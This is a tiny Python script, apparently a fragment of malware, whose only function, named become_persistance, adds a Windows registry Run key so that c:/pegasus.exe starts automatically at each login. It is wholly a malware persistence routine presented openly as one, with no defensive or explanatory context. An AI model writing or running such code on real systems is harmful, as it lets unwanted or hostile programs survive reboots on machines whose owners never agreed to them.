import subprocess

def become_persistance():
	subprocess.call("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v pegasus /t REG_SZ /d 'c:/pegasus.exe' ")

become_persistance()

